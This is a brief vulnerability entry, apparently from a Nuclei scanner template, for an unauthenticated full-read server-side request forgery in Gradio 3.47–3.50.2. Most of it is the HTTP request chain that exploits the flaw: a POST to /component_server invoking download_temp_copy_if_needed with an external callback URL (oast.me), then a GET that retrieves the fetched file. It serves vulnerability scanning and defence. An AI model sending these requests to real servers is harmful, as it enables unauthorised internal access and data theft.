# Vulnerability: Gradio 3.47 - 3.50.2 - Server-Side Request Forgery
**Classification:** CWE-918
**Source:** Nuclei Template (`gradio-ssrf.yaml`)

## Description
Gradio Full Read SSRF when auth is not enabled, this version should work for versions 3.47 - 3.50.2.

## Vulnerable Code Pattern / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /component_server HTTP/1.1
Host: {{Hostname}}

POST /component_server HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json

{"component_id": "{{fuzz_component_id}}", "data": "http://oast.me", "fn_name": "download_temp_copy_if_needed", "session_hash": "aaaaaaaaaaa"}

GET /file={{download_path}} HTTP/1.1
Host: {{Hostname}}
```

